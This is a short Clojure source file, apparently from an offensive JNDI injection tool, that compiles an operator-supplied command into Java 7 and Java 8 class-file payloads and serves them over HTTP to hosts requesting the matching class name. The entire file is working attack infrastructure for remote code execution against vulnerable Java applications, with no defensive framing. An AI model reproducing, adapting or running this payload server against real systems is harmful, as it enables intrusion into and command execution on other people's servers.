(ns jndi-injector-clj.server
  (:import [org.pwn
            Payload]
           [javassist.bytecode
            ClassFile])
  (:require [clojure.string :as str]))

(defn gen-handler [app-conf]
  (let [command (:command app-conf)
        class-name7 (:class-name (:java7 app-conf))
        class-name8 (:class-name (:java8 app-conf))
        payload-7 (Payload/build command ClassFile/JAVA_7 class-name7)
        payload-8 (Payload/build command ClassFile/JAVA_8 class-name8)]
   (fn [request]
    (println "[+] incoming request " (:uri request))
    (cond 
      (str/includes? (:uri request) class-name8) {:status 200 :body payload-8}
      (str/includes? (:uri request) class-name7) {:status 200 :body payload-7}
      :else {:status 200 :body "not implemented!"}))))